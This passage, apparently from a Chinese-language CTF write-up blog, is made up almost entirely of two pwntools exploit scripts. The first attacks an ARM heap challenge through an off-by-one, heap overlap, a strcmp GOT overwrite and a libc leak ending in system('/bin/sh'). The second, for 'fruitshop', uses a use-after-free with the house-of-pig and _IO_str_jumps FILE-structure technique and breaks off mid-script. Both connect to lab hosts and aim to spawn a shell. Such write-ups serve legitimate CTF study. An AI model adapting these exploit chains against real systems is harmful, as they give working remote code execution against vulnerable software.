<span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">		md5 = hashlib.md5()</span><br><span class="line">		md5.update(answer)</span><br><span class="line">		hashresult = md5.hexdigest()</span><br><span class="line">		<span class="keyword">if</span> hashresult.startswith(hash_value):</span><br><span class="line">			log.info(<span class="string">&quot;hash :&quot;</span>+hashresult)</span><br><span class="line">			log.info(<span class="string">&quot;answer: &quot;</span> +answer)</span><br><span class="line">			<span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fix</span>(<span class="params">msg,choose,add, idx</span>):</span><br><span class="line">	msg = msg.ljust((<span class="number">0x4b</span>-<span class="number">0x10</span>-<span class="number">0x3</span>),<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">	header = p32(<span class="number">0x11451400</span>)</span><br><span class="line">	p8_12 = p32(add) <span class="comment"># Add</span></span><br><span class="line">	p12_16 = p32(idx)</span><br><span class="line">	int_p4_8 = add ^ idx</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> msg:</span><br><span class="line">		int_p4_8 ^= <span class="built_in">ord</span>(i)</span><br><span class="line">	p4_8 = p32(int_p4_8)</span><br><span class="line">	log.info(<span class="string">&quot;p4_8 :&quot;</span> + <span class="built_in">hex</span>(int_p4_8))</span><br><span class="line">	payload = header + p4_8 + p8_12 + p12_16 + msg +choose</span><br><span class="line">	log.info(<span class="string">&quot;length of payload :&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">	log.info(<span class="string">&quot;payload[0x8] Add:&quot;</span>+payload[<span class="number">0x8</span>].encode(<span class="string">&#x27;hex&#x27;</span>) )</span><br><span class="line">	log.info(<span class="string">&quot;payload[0x48] Delete :&quot;</span>+payload[<span class="number">0x48</span>].encode(<span class="string">&#x27;hex&#x27;</span>) )</span><br><span class="line">	log.info(<span class="string">&quot;payload[0x49] Show :&quot;</span>+payload[<span class="number">0x49</span>].encode(<span class="string">&#x27;hex&#x27;</span>) )</span><br><span class="line">	log.info(<span class="string">&quot;payload[0x4a] Edit:&quot;</span>+payload[<span class="number">0x4a</span>].encode(<span class="string">&#x27;hex&#x27;</span>) )</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 48</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>():</span><br><span class="line">	<span class="keyword">return</span> p8(<span class="number">1</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 49</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>():</span><br><span class="line">	<span class="keyword">return</span> p8(<span class="number">0</span>)+p8(<span class="number">1</span>)+p8(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 4A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>():</span><br><span class="line">	<span class="keyword">return</span> p8(<span class="number">0</span>)+p8(<span class="number">0</span>)+p8(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">ip,port,debug</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">1</span>:</span><br><span class="line">		context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">		sh=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>,proc])</span><br><span class="line">		libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">		context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">		sh=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,proc])</span><br><span class="line">		libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">		sh=remote(<span class="string">&quot;192.168.1.104&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">		libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># add 10</span></span><br><span class="line">	md5_check = passcheck(<span class="string">&quot;4d8900&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			<span class="comment"># md5_check = &quot;ReStr0&quot;</span></span><br><span class="line">		msg = <span class="string">&quot;AAAAA&quot;</span></span><br><span class="line">		payload = fix(msg,Show(),<span class="number">0x10</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">		sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># off by one</span></span><br><span class="line">	msg = <span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>+<span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">	payload = fix(msg,Edit(),<span class="number">0</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete three chunk</span></span><br><span class="line">	msg = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">	payload = fix(msg,Delete(),<span class="number">0</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	msg = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">	payload = fix(msg,Delete(),<span class="number">0</span>, <span class="number">2</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#heap overlap</span></span><br><span class="line">	msg = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">	payload = fix(msg,Delete(),<span class="number">0</span>, <span class="number">1</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">#x/20wx 0x24150</span></span><br><span class="line">	msg = <span class="string">&quot;B&quot;</span>*<span class="number">0x10</span> + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">	payload = fix(msg,Show(),<span class="number">0x30</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	free_got = <span class="number">0x00023014</span></span><br><span class="line">	strlen_got = <span class="number">0x00023034</span></span><br><span class="line">	strcmp_got = <span class="number">0x0002300c</span></span><br><span class="line"></span><br><span class="line">	msg = <span class="string">&quot;B&quot;</span>*<span class="number">0x18</span> + p32(strcmp_got-<span class="number">8</span>)</span><br><span class="line">	payload = fix(msg,Edit(),<span class="number">0</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">&#x27;free_offset: &#x27;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">	log.success(<span class="string">&#x27;system_offset: &#x27;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">#add 1 victim chunk</span></span><br><span class="line">	msg = <span class="string">&quot;B&quot;</span></span><br><span class="line">	payload = fix(msg,Show(),<span class="number">0x10</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># #add 2 target chunk</span></span><br><span class="line">	msg = <span class="string">&quot;B&quot;</span></span><br><span class="line">	payload = fix(msg,Show(),<span class="number">0x10</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	msg = <span class="string">&quot;C&quot;</span></span><br><span class="line">	payload = fix(msg,Show(),<span class="number">0</span>, <span class="number">2</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	libc_base = u32(sh.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	binsh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">	msg = <span class="string">&quot;F&quot;</span>*<span class="number">0x18</span> + p32(system_addr) + p32(binsh_addr)</span><br><span class="line">	payload = fix(msg,Edit(),<span class="number">0</span>, <span class="number">0</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	msg = <span class="string">&quot;End&quot;</span></span><br><span class="line">	payload = fix(msg,Show(),<span class="number">0</span>, <span class="number">1</span>)+md5_check</span><br><span class="line">	sh.sendafter(<span class="string">&quot;Input code&gt;\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	pwn(<span class="string">&#x27;192.168.1.104&#x27;</span>,<span class="number">8888</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="fruitshop">fruitshop</span><a href="#fruitshop" class="header-anchor"></a></h3><p>uaf，直接house of pig一把梭。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.aslr = False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">fruit, index, content</span>):</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;(new):\n&quot;</span>, fruit)</span><br><span class="line">    r.sendafter(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:\n\x00&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">fruit, index, content</span>):</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, fruit)</span><br><span class="line">    r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:\n\x00&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_Apple</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, <span class="string">&quot;Apple&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Do~\n&quot;</span>, content[:<span class="number">0x200</span>])</span><br><span class="line">    r.sendafter(<span class="string">&quot;Re~\n&quot;</span>, content[<span class="number">0x200</span>:<span class="number">0x200</span>+<span class="number">0xAB0</span>])</span><br><span class="line">    r.sendafter(<span class="string">&quot;Mi~\n&quot;</span>, content[<span class="number">0x200</span>+<span class="number">0xAB0</span>:<span class="number">0x200</span>+<span class="number">0xAB0</span>+<span class="number">0x100</span>])</span><br><span class="line">    r.sendafter(<span class="string">&quot;Fa~\n&quot;</span>, content[<span class="number">0x200</span>+<span class="number">0xAB0</span>+<span class="number">0x100</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">fruit, index</span>):</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;(delete):\n&quot;</span>, fruit)</span><br><span class="line">    r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">fruit, index</span>):</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;(show):\n&quot;</span>, fruit)</span><br><span class="line">    r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;192.168.1.107&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>)</span><br><span class="line">heap = u64((r.recvuntil(<span class="string">&quot;What do you want to do?&quot;</span>)[:-(<span class="number">23</span> + <span class="number">0x110</span> - <span class="number">0x10</span>)])[-<span class="number">8</span>:]) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap: &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">show(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>)</span><br><span class="line">libc = u64((r.recvuntil(<span class="string">&quot;What do you want to do?&quot;</span>)[:-(<span class="number">23</span> + <span class="number">0xDD0</span> - <span class="number">0x10</span>)])[-<span class="number">8</span>:]) + <span class="number">0x15555531a000</span> - <span class="number">0x155555506be0</span></span><br><span class="line">_IO_str_jumps = <span class="number">0x155555503560</span> - <span class="number">0x15555531a000</span> + libc</span><br><span class="line">_IO_list_all = libc + <span class="number">0x1ed5a0</span></span><br><span class="line">__free_hook = libc + <span class="number">0x1eee48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(__free_hook - <span class="number">0x20</span> - <span class="number">0x8</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, <span class="string">&quot;Apple&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.sendafter(<span class="string">&quot;Do~\n&quot;</span>, payload)</span><br><span class="line">r.sendafter(<span class="string">&quot;Re~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Mi~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Fa~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) + p64(heap + <span class="number">0x1f70</span>) * <span class="number">3</span>)</span><br><span class="line">payload = p64(heap + <span class="number">0xf50</span>) + p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) + p64(heap + <span class="number">0xf50</span>) * <span class="number">2</span></span><br><span class="line">r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, <span class="string">&quot;Apple&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.sendafter(<span class="string">&quot;Do~\n&quot;</span>, payload)</span><br><span class="line">r.sendafter(<span class="string">&quot;Re~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Mi~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Fa~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, <span class="string">&quot;Apple&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.sendafter(<span class="string">&quot;Do~\n&quot;</span>, payload)</span><br><span class="line">r.sendafter(<span class="string">&quot;Re~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Mi~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Fa~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) + p64(heap + <span class="number">0x1f70</span>) * <span class="number">3</span>)</span><br><span class="line">payload = p64(heap + <span class="number">0xf50</span>) + p64(<span class="number">0x1555555071e0</span> - <span class="number">0x15555531a000</span> + libc) + p64(heap + <span class="number">0xf50</span>) * <span class="number">2</span></span><br><span class="line">r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;(edit):\n&quot;</span>, <span class="string">&quot;Apple&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.sendafter(<span class="string">&quot;Do~\n&quot;</span>, payload)</span><br><span class="line">r.sendafter(<span class="string">&quot;Re~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Mi~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Fa~\n&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    delete(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">3</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Banana&quot;</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;Apple&quot;</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">3</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;Apple&quot;</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;Banana&quot;</span>, <span class="number">2</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;Cherry&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, p64(heap + <span class="number">0x7930</span>) + p64(__free_hook - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;Durian&quot;</span>, <span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x56</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#0x38</span></span><br><span class="line">payload += p64(heap + <span class="number">0xfa0</span>) + p64(heap + <span class="number">0xfa0</span> + <span class="number">0x53</span>)</span><br><span class="line"><span class="comment">#0x38  _IO_buf_base</span></span><br><span class="line"><span class="comment">#0x40  _IO_buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span>+  p64(<span class="number">0</span>) + p64(libc + <span class="number">0x52290</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(_IO_str_jumps)</span><br><span class="line">edit(<span class="string">&quot;Banana&quot;</span>, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_IO_cleanup</span></span><br><span class="line"><span 